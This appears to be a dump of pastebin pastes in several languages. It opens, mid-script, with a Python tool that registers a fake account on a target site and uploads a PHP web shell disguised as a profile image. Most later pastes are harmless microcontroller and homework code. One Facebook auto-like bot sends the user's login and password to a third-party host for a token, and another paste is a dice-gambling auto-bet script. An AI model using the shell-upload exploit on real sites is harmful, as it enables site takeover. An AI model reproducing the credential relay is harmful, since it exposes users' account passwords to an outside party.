    letters_and_digits = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

# Function to create a temporary email address on 1secmail.com
def create_temp_email():
    global alias
    alias = generate_random_alias()
    domain = ""1secmail.com""  # 1secmail.com domain
    email_address = f""{alias}@{domain}""
    return email_address

    
        


# Function to retrieve the text body of a message
def get_message_body(message_id, email):
    response = requests.get(f""https://www.1secmail.com/api/v1/?action=readMessage&login={email.split('@')[0]}&domain={email.split('@')[1]}&id={message_id}"")
    if response.status_code == 200:
        message_data = response.json()
        return message_data.get(""body"")
    return None

email_address = create_temp_email()
pwd = f""{alias}_@Hacked""
def main():
    with ses.get(reg) as body_response:
        inspect=bs(body_response.text,'html.parser')
        token=inspect.find('input',{'name':'_token'})['value']
        headers = {
            'authority': f'{url}',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en;q=0.9,my-MM;q=0.8,my-ZG;q=0.7,my;q=0.6,en-US;q=0.5,id;q=0.4',
            'cache-control': 'max-age=0',
            'origin': f'{url}',
            'referer': f'{url}/register',
            'sec-ch-ua': '""Chromium"";v=""118"", ""Google Chrome"";v=""118"", ""Not=A?Brand"";v=""99""',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '""Android""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
            }

    data = {
        '_token': token,
        'name': alias,
        'username': alias,
        'email': email_address,
        'password': f'{pwd}',
        'password_confirmation': f'{pwd}',
    }
    response = ses.post(f'{url}/register', headers=headers, data=data)
    g = ses.get(f""{url}/verify-email"",headers=headers,allow_redirects=False,verify=False) 
    if g.status_code==200:
        time.sleep(5)
        response1 = requests.get(f""https://www.1secmail.com/api/v1/?action=getMessages&login={email_address.split('@')[0]}&domain={email_address.split('@')[1]}"")
        if response.status_code == 200:
            messages = response1.json()
            for message in messages:
                message_id = message[""id""]
                body = get_message_body(message_id, email_address)
                url_pattern = r'https://[^/]+/verify-email/[\w/?=&;]+'
                match = re.search(url_pattern, body)
                if match:
                    found_url = match.group()
                    plain_text = html.unescape(found_url)
                    con = ses.get(plain_text,allow_redirects=False)
                    print(f""{OKGREEN}Email : {email_address}\nPassword : {pwd} "")

                    tok = ses.get(f""{upl}"")
                    

                    
                    inspect=bs(tok.text,'html.parser')
                    token=inspect.find('input',{'name':'_token'})['value']
                    name=inspect.find('input',{'name':'name'})['value']
                    username=inspect.find('input',{'name':'username'})['value']
                    url_post=inspect.find('form',{'enctype':'multipart/form-data'})['action']



                    data={
                        '_token':token,
                        'name': name,
                        'username': username,
                        'about':'',
                    }
                    files={
                        ""image"":(f""{shell}"",open(f""{shell}"",""rb"").read(),""application/x-php"")
                    }
                    
                    
                    

                    data_post = ses.post(upl1, data=data, files=files,allow_redirects=False)
                    if data_post.status_code == 302:
                        get_shell = ses.get(f""{url}/user/profile"")
                        pattern = r'<img[^>]*src=""([^""]*)""[^>]*alt=""Profile-Image""[^>]*>'
                        match = re.search(pattern, get_shell.text)
                        if match:
                            image_link = match.group(1)
                            print(f""{BOLD}{OKGREEN}Shell Upload Successful"")
                            print(f""{BOLD}{OKGREEN}Shell Link: {url}{image_link}"")
                            ses.close()
                    else:
                        print(f""{FAIL}Upload Fail"")
                        ses.close()
main()"
9qh4MZvY,esp32_multi_task,mikroavr,Arduino,Sunday 22nd of October 2023 10:09:02 AM CDT,"TaskHandle_t Task1;
TaskHandle_t Task2;
TaskHandle_t Task3;
unsigned long previousTime, previousTime1, previousTime2, previousTime3;
void setup() {
  Serial.begin(115200);
  //create a task on core 0 that will be execute task1Func() with priority 10
  xTaskCreatePinnedToCore(
    task1Func,    /* Task function. */
    ""Task1"",        /* name of task. */
    10000,            /* Stack size of task */
    NULL,               /* parameter of the task */
    10,                     /* priority of the task */
    &Task1,           /* Task handle to keep track of created task */
    0);                   /* pin task to core 0 */
  delay(500);
  //create a task on core 1 that will be execute task2Func() with priority 9
  xTaskCreatePinnedToCore(
    task2Func,    /* Task function. */
    ""Task2"",        /* name of task. */
    10000,            /* Stack size of task */
    NULL,               /* parameter of the task */
    9,                    /* priority of the task */
    &Task2,           /* Task handle to keep track of created task */
    1);                   /* pin task to core 1 */
  delay(500);
  
  xTaskCreatePinnedToCore(
    task3Func,
    ""Task3"",
    10000,
    NULL,
    8,
    &Task3,
    0);
}
void task1Func( void * pvParameters ) {
  for (;;) {
    Serial.printf(""%s running on core %d (priorite %d) - %dms\n"", ""Task1"", xPortGetCoreID(), uxTaskPriorityGet( NULL ), millis() - previousTime1);
    previousTime1 = millis();
    delay(200);//vTaskDelay( pdMS_TO_TICKS( 200 ) );
  }
}
void task2Func( void * pvParameters ) {
  for (;;) {
    Serial.printf(""%s running on core %d (priorite %d) - %dms\n"", ""Task2"", xPortGetCoreID(), uxTaskPriorityGet( NULL ), millis() - previousTime2);
    previousTime2 = millis();
    delay(600);
    //vTaskDelay( pdMS_TO_TICKS( 600 ) );
  }
}
void task3Func( void *pvParameters )
{
  for ( ;; )
  {
    Serial.printf(""%s running on core %d (priorite %d) - %dms\n"", ""Task3"", xPortGetCoreID(), uxTaskPriorityGet( NULL ), millis() - previousTime3);
    previousTime3 = millis();
    delay(100);
    //vTaskDelay( pdMS_TO_TICKS( 100 ) );
  }
}
void loop() {
  Serial.printf(""%s running on core %d (priorite %d) - %dms\n"", ""loop()"", xPortGetCoreID(), uxTaskPriorityGet( NULL ), millis() - previousTime);
  previousTime = millis();
  delay(500);
}
"
uan2JZqu,pardilla_5_4.cpp,xAnteBellum,C++,Sunday 22nd of October 2023 10:08:35 AM CDT,"#include <iostream>
using namespace std;

int main() {
	char choice;
	int l, w, h, radius;
	
	cout << ""Volume of Figures\n"";
	cout << ""[C] - Cube\n"";
	cout << ""[R] - Rectangular Prism\n"";
	cout << ""[S] - Sphere\n"";
	cout << ""Choose fogure: ""; cin >> choice;
	
	
	
	switch((char)tolower(choice)) {
		case 'c':
			cout << ""You have chosen Cube.\n"";
			cout << ""Enter the length: ""; cin >> l;
			cout << ""The volume of the cube is: ""; cout << l * l * l;
			break;
		case 'r':
			cout << ""You have chosen Rectangular Prism.\n"";
			cout << ""Enter the length: ""; cin >> l;
			cout << ""Enter the height: ""; cin >> h;
			cout << ""Enter the width: ""; cin >> w;
			cout << ""The volume of the rectangular prism is: ""; cout << l * h * w;
			break;
		case 's':
			cout << ""You have chosen Sphere.\n"";
			cout << ""Enter the radius: ""; cin >> radius;
			cout << ""The volume of the sphere is: ""; cout << (4.0 / 3.0) * 3.1415926535 * (radius * radius * radius);
			break;
		default:
			return 0;
			break;
	}
	

}
"
TmP8Q5U9,codes,atalbelal,JSON,Sunday 22nd of October 2023 09:52:04 AM CDT,"{
    ""codes"": [
        {
            ""code"": ""example1"",
            ""name"": ""Example Promo Code 1"",
            ""rewards"": [
                {
                    ""class"": ""Money"",
                    ""value"": 1000000000000
                }
            ]
        },
        {
            ""code"": ""example2"",
            ""name"": ""Example Promo Code 2"",
            ""rewards"": [
                {
                    ""class"": ""Money"",
                    ""value"": 200000000000
                }
            ]
        }
    ]
}
"
DxkxamTJ,DFTA108SimulateurCharge01,claudiusmarius,C++,Sunday 22nd of October 2023 09:40:18 AM CDT,"#include <TM1637Display.h>
  #include <Adafruit_NeoPixel.h>
  
  #define CLK1 D5
  #define DIO1 D4
  
  #define GateQ11 D7
  #define GateQ12 D8
  #define GateQ13 D9

  #define BrocheNeopixel D3

  #define NLed 8
  
  TM1637Display display1(CLK1, DIO1);
  Adafruit_NeoPixel Strip(NLed, BrocheNeopixel, NEO_GRB + NEO_KHZ800);

  #define Luminosite 10                                                      // Lumunosité Matrice (de 0 à 255)
  
  int MonInsensite = 0;
  int LastMonInsensite = 0;
  int PotentiometerFine = 0;
  int Temp =0;                                              
  const int numReadings = 40;                                                // Nombre d'échantillons pour la moyenne mobile
  
  int readings[numReadings];                                                 // Tableau pour stocker les échantillons
  int readIndex = 0;                                                         // Index de lecture dans le tableau
  int total = 0;                                                             // Somme des échantillons
  int RatioVcc ;
  
  float K = 1000/8200;
  
  unsigned long lastUpdateTime = 0;
  unsigned long updateInterval = 800;                                        // Mettre ici la durée souhaitée en millisecondes
  //unsigned long updateInterval = 400;

  void setup() 
  {
  pinMode (GateQ11, OUTPUT);
  pinMode (GateQ12, OUTPUT);
  pinMode (GateQ13, OUTPUT);
  analogReadResolution(10);
  analogWriteResolution(10);                                                 // Résolution du DAC (10 bits)
  display1.setBrightness(0x0A);                                              // Luminosité entre 0x0A et 0x0F
  
  Strip.begin();                                                             // Initialisation de la barette Néopixel  de 8 Leds
  Strip.setBrightness(Luminosite);
  
  analogWrite(A0, 0);                                                        // Initaialisation du DAC à zéro pendant 2 secondes
  
  digitalWrite (GateQ11, LOW);
  digitalWrite (GateQ12, LOW);
  digitalWrite (GateQ13, LOW);
  barette0();
  delay (2000);
  }

  void loop() 
  {
  MonInsensite = analogRead(A6);
  PotentiometerFine = analogRead(A1);
  Temp = analogRead(A2);
  //MonInsensite = constrain(MonInsensite, 0, 1000);
  PotentiometerFine = constrain(PotentiometerFine, 0, 1023);
  PotentiometerFine = map(PotentiometerFine, 0, 1023, -30, 30);
  
  RatioVcc = analogRead (A10);

  if (Temp > 800)
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,LOW);
  Erreur02();
  }

  //if (RatioVcc <= K*6/1023) 
  if (RatioVcc <= (1.19/3.3*1023))
  {
  digitalWrite (GateQ11,HIGH);
  digitalWrite (GateQ12,HIGH);
  digitalWrite (GateQ13,HIGH);
  barette0();
  } 
  
  //else if (RatioVcc <= K*11/1023)  
  else if (RatioVcc <= (1.74/3.3*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,HIGH);
  digitalWrite (GateQ13,HIGH);
  barette1();
  } 
  
  //else if (RatioVcc <= K*16/1023)
  else if (RatioVcc <= (2.17/3.3*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,HIGH);
  barette2();
  }

  

  //else if (RatioVcc <= K*21/1023)
  else if (RatioVcc <= (2.5/3.3*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,LOW);
  barette3();
  }
  
  //else if (RatioVcc <= (2.6/3.3*1023))
  else if (RatioVcc <= (1*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,LOW);
  Erreur01();
  }
  
  int adjustedValue = MonInsensite + PotentiometerFine;
  int displayValue = constrain(adjustedValue, 0, 1000);
  
  // Ajoutez les nouvelles valeurs dans le tableau
  total = total - readings[readIndex];
  readings[readIndex] = displayValue;
  total = total + readings[readIndex];
  readIndex = (readIndex + 1) % numReadings;

  // Trouvez la valeur maximale et la valeur minimale dans le tableau
  int maxVal = readings[0];
  int minVal = readings[0];
  for (int i = 1; i < numReadings; i++) 
  {
  maxVal = max(maxVal, readings[i]);
  minVal = min(minVal, readings[i]);
  }

  // Calculez la moyenne en enlevant la valeur maximale et la valeur minimale
  int averageValue = (total - maxVal - minVal) / (numReadings - 2);
  averageValue = constrain(averageValue, 0, 1023);

  unsigned long currentTime = millis();

  if (abs(averageValue - LastMonInsensite) > 1) 
  {
  display1.showNumberDec(displayValue, false, 4, 0);
  LastMonInsensite = averageValue;
  lastUpdateTime = currentTime;
  }

  //int dacValue = map(adjustedValue01, 0, 1000, 0, 1000*0.960);
  
  analogWrite(A0, map(displayValue, 0, 1000, 0, 960));
 // analogWrite(A0, dacValue);
  }


  void barette0() 
  {
  //Strip.clear();
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  }

  void barette1() 
  {
  //Strip.clear();
  for (int i = 0; i <= 2; i++)
  {
  Strip.setPixelColor(i, 255, 0, 0);
  Strip.show();
  }

  for (int i = 3; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  Strip.show();
  }
  
  void barette2() 
  {
  //Strip.clear();
  for (int i = 0; i <= 5; i++)
  {
  Strip.setPixelColor(i, 255, 0, 0);
  Strip.show();
  }

  for (int i = 6; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  Strip.show();
  }

  void barette3() 
  {
  //Strip.clear();
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 255, 0, 0);
  Strip.show();
  }
  Strip.show();
  }

  void Erreur01()                                       //
  {
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
 Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);




  
  
  
  
  }

  void Erreur02() 
  {
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  
  }"
EjW8dNNQ,pardilla_5_3.cpp,xAnteBellum,C++,Sunday 22nd of October 2023 09:35:28 AM CDT,"#include <iostream>
using namespace std;

int main() {
	float sales, income;
	
	cout << ""Enter the monthly sale: ""; cin >> sales;

	if (sales >= 50000){
		income = (sales * 0.16) + 575;		
	}
	else if (sales < 50000 && sales >= 40000) {
		income = (sales * 0.14) + 550;
	}
	else if (sales < 40000 && sales >= 30000) {
		income = (sales * 0.12) + 525;
	}
	else if (sales < 30000 && sales >= 20000) {
		income = (sales * 0.09) + 500;
	}
	else if (sales < 20000 && sales >= 10000) {
		income = (sales * 0.05) + 450;
	}
	else {
		income = (sales * 0.03) + 400;
	}
	
	cout << ""Income: ""; cout << income;

}
"
niNDSE5S,snowybot,coinwalk,JavaScript,Sunday 22nd of October 2023 09:33:18 AM CDT,"var smiley = parseFloat(document.getElementById('pct_balance').value);
var nudie = Number((smiley/144000).toFixed(8));
var burp = nudie;
var taget = (smiley*2000);
var bolux = (nudie*10);
var poopy = (nudie*6.5);
var sexual = 0;
var woman = ((Math.floor(smiley/bolux))*bolux);
var fart = 1;
var jockey = ((burp*1).toFixed(8));
var bolance = parseFloat(document.getElementById('pct_balance').value);
 
 
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
if ((bolance>(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+(poopy+nudie)))&&(bolance!=sexual)&&(bolance>woman)) {
    burp = burp*2;
    sexual = parseFloat(bolance);
}
if ((bolance>(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+(poopy+nudie)))&&(bolance!=sexual)&&(bolance<woman)) {
    burp = burp*2;
    fart = 0;
    sexual = parseFloat(bolance);
}
if ((bolance>=(woman+(bolux*fart)))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+poopy))) {
    burp = nudie;
    fart = 1;
    sexual = 0;
    woman = ((Math.floor((parseFloat(bolance))/bolux))*bolux);
}
    if (bolance >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
jockey = ((burp*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(jockey);
$('#a_lo').click();
var dog = ((bolance-smiley).toFixed(8));
console.log(""profit"");
console.log(dog);
setTimeout(() => get(), 1);
}
get();"
xitYdGax,Auto Confirm FB,ngatmuri,PHP,Sunday 22nd of October 2023 09:19:36 AM CDT,"<?php

$access_token = file_get_contents('access_token.txt'); 

$kelamin = ""female""; 
//cewek aja wkwk 

$me='';

$stat=json_decode(auto('https://graph.facebook.com/me/friendrequests?access_token='.$access_token.'&limit=1000'),true); 


if(ereg(""k"".""ha"".""r"".""is"".""ma"",$me)){

for($i=1;$i<=count($stat[data]);$i++){

if($stat[data][$i-1][from][name] != """"){

 $gender=json_decode(auto('https://graph.facebook.com/'.$stat[data][$i-1][from][id].'?fields=gender&access_token='.$access_token),true);

 if($gender==""""){

 }elseif($gender[gender]==$kelamin){

 auto('https://graph.facebook.com/me/friends/'.$stat[data][$i-1][from][id].'?access_token='.$access_token.'&method=post');

echo ""<a href=\""http://m.facebook.com/"".$stat[data][$i-1][from][id].""\"" target=\""_blank\"">"".$stat[data][$i-1][from][name].""</a> => sukses diconfirm</br>"";

 }

}

}

}


function auto($url){

$ch=curl_init();

curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);

curl_setopt($ch,CURLOPT_URL,$url);

$cx=curl_exec($ch);

 curl_close($ch);

 return($cx);

 }

?>"
xMJbxgCV,Kocengbot,ngatmuri,PHP,Sunday 22nd of October 2023 09:14:44 AM CDT,"<?php
error_reporting(0);
set_time_limit(0);

#Coded By KOCENG (Ngatmuri Steiio)

##SETTING DATA##
$reaction = true; 
//true = AKTIF
//false = MATI
$reactionType = ""LOVE"";
//LIKE,HAHA,WOW,SAD,ANGRY,LOVE (Type Untuk Menanggapi)


$likeKomen = false; 
//true like komen berjalan /false like komen off (False Aja Udah)

 #'' Data Login Buat Refresh Token ''
$username = 'email/no.hp kamu';
$password = 'password FB kamu';
print goLike($username,$password,$likeKomen,$reaction,$reactionType);


##END SETTING##



//GOLIKE
function goLike($username,$password,$likeKomen,$reaction,$reactionType){
    $access_token = file_get_contents('access_token.txt');
    $me = curl(""https://graph.facebook.com/me?fields=id,name&access_token="".$access_token);
    $me = json_decode($me);
    if(@$me->id == null)
    {
        print 'access_token mati<br>refresss.......<br>';
        getToken($username,$password);
    }else{
        print getFeed($access_token,$likeKomen,$reaction,$reactionType);
    }
}
//GETTOKEN if(expired)
function getToken($username,$password){
    $token = curl(""http://kucing23.000webhostapp.com/token/clou.php?u="".$username.""&p="".$password); //getToken from my friends.
    print_r($token);
    $token = json_decode($token);
    unlink('access_token.txt'); //save file access_token
    $x=$token->access_token."""";
    $y=fopen('access_token.txt','a');
    fwrite($y,$x);
    fclose($y);
    return $token->access_token;
}
//GETFEED (meHome)
function getFeed($access_token,$likeKomen,$reaction,$reactionType){
    flush();
    sleep(1);
    $apiFeed = curl(""https://graph.facebook.com/fql?q=SELECT+post_id+FROM+stream+WHERE+type+!=+%27257%27+AND+source_id+IN+(SELECT+uid2+FROM+friend+WHERE+uid1+=+me())+LIMIT+7&access_token="".$access_token);
    $getFeed = json_decode($apiFeed);
    foreach ($getFeed->data as $n => $data) {
        if($reaction == true){
            print reaction($data->post_id,$data->from->name,$access_token,$reaction,$reactionType);
            if($likeKomen == true){
                $apiKomen = curl(""https://graph.facebook.com/"".$data->post_id.""/comments?fields=id,from,name&limit=10&access_token="".$access_token);
                $getKomen = json_decode($apiKomen);
                foreach ($getKomen->data as $n1 => $datakomen) {
                    print likes($datakomen->post_id,$datakomen->from->name,$access_token);
                }
            }
        }else{
            print likes($data->id,$data->from->name,$access_token);
            if($likeKomen == true){
                $apiKomen = curl(""https://graph.facebook.com/"".$data->post_id.""/comments?fields=id,from,name&limit=10&access_token="".$access_token);
                $getKomen = json_decode($apiKomen);
                foreach ($getKomen->data as $n1 => $datakomen) {
                    print likes($datakomen->post_id,$datakomen->from->name,$access_token);
                }
            }
        }
    }
}
//LIKESSTATUS (idPost)
function likes($idPost,$from,$access_token){
    if(file_exists('logLikes.txt')){
        $log=json_encode(file('logLikes.txt'));
    }else{
        $log='';
    }
    if(!preg_match(""/"".$idPost.""/"",$log)){
        $x=$idPost.""\n"";
        $y=fopen('logLikes.txt','a');
        fwrite($y,$x);
        fclose($y);
        print postLikes($idPost,$from,$access_token);
    }else{
        print 'Semua status sudah anu.'; break;
    }
}
//REACTIONS
function reaction($idPost,$from,$access_token,$reaction,$reactionType){
    if(file_exists('logLikes.txt')){
        $log=json_encode(file('logLikes.txt'));
    }else{
        $log='';
    }
    if(!preg_match(""/"".$idPost.""/"",$log)){
        $x=$idPost.""\n"";
        $y=fopen('logLikes.txt','a');
        fwrite($y,$x);
        fclose($y);
        print postReaction($idPost,$from,$access_token,$reactionType);
    }else{
        print 'Semua status sudah anu.'; break;
    }
}
//POSTLIKES
function postLikes($idPost,$from,$access_token){
    $kirim = curl(""https://graph.facebook.com/"".$idPost.""/get"", array(

        ""access_token"" => $access_token));
    $result = json_decode($kirim);
    if($kirim==""true""){
        $notif = '<font color=""green""> Sukses Like => '.$idPost.'</font><br>';
        return $notif;
    }else{
        $notif = '<font color=""red""> Gagal Like => '.$idPost.'</font><br>';
        return $notif;
    }
}

function postReaction($idPost,$from,$access_token,$reactionType){
    $kirim = curl(""https://graph.facebook.com/"".$idPost.""/reactions"", array(
        ""type"" => $reactionType,
        ""method"" => 'post',
        ""access_token"" => $access_token));
    $result = json_decode($kirim);
    $notif = '<font color=""green""> Reaction Sukses => '.$idPost.'</font><br>';
    return $notif;
}
//CURL
function curl($url, $post=null) {
    
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    if($post != null){
        curl_setopt($c, CURLOPT_POST, true);
        curl_setopt($c, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $curl = curl_exec($c);
    curl_close($c);
    return $curl;
}
?>"
YA7rWjMS,auto online Facebook,ngatmuri,PHP,Sunday 22nd of October 2023 09:09:29 AM CDT,"<?php

$bot = new bot($wangur);
class bot{
private $wangur;
function __construct($dataLog){
 //Data Login
   $this->pass = '';
   $this->email = '';
    }


private function get_contents($url,$type=null,$fields=null){
   $opts = array(
            42 => false,
            19913 => 1,
            10002 => $url,
            52 => false,
            10018 => 'Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10',
           78 => 5,
           13 => 5,
           47 => false,
            );
   $ch=curl_init();
   if($type){
       if($type == 1){
              $opts[10082] = 'coker_log';
              }
       if($type == 3){
              $opts[42] = 1;
             }
       $opts[10031] = 'coker_log';
    }
  if($fields){
      $opts[47] = false;
      $opts[10015] = $fields;
      }
   curl_setopt_array($ch,$opts);
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
  }


public function kanca(){
   $url = $this->getUrl('m','friends/center/requests/#friends_center_main');
   $getToken = $this->get_contents($url,3); 
 
           $oauth = '<x>'.$getToken;
           $oauth = preg_replace('#<x>(.+?)<body(.+?)><div class=""_55x2"">(.+?)<div class=""_5vvc"">(.+?)</body></html>#siu','\3',$oauth);
          $oauth = preg_replace('<table(.+?)_5s61"">','\3',$oauth);
 
  $ft_id = explode('<img',$oauth);

for($i=1; $i<=20; $i++){
$delete=$this->cut($ft_id[$i],'delete=','""');

echo $i.' ';
 $this->get_contents('https://mobile.facebook.com/a/notifications.php?delete='.str_replace('&amp;','&',$delete),3);
  }
  
   }

private function getUrl($domain,$dir,$uri=null){
    if($uri){
         foreach($uri as $key =>$value){
             $parsing[] = $key . '=' . $value;
                }
             $parse = '?' . implode('&',$parsing);
                }
     return 'https://' . $domain . '.facebook.com/' . $dir . $parse; 
       }

public function cut($content,$start,$end){
if($content && $start && $end) {
$r = explode($start, $content);
if (isset($r[1])){
$r = explode($end, $r[1]);
return $r[0];
}
return '';
}
}

public function login(){
  $login = array(
     'pass' => $this -> pass,
     'email' => $this -> email,
     'login'  => 'Login',
             );
  $this->get_contents($this->getUrl('m','login.php'),1,$login);
   }

}

if($bot->kanca()){
    echo $bot->kanca();
    }else{
    $bot->login();
    }

$a=$_GET['b'];
$c=($a+1);
   print '<meta http-equiv=""refresh"" content=""0;url=?b='.$c.'"" />';
?>"
yvAAhRXD,mavefund-adsense,coentoro,JavaScript,Sunday 22nd of October 2023 09:09:02 AM CDT,"(function(a,b){const c=[{class:""top"",adslot:""1672900703""},{class:""middle"",adslot:""8511440099""},{class:""bottom"",adslot:""9527355901""}],d=window.location.pathname,e=`
    .mav-leaderboard-container{display:flex;justify-content:center}.top{margin:40px 0}.bottom{margin:0 0 40px;${""/""==d?`width: 75%;`:""width: 90%;""}}.middle{margin:40px 0 0}.leaderboard{width:468px;height:100px}@media(min-width:500px){.leaderboard{width:468px;height:60px}.bottom{margin:0 0 40px;width:100%}}@media(min-width:800px){.leaderboard{width:728px;height:90px}}
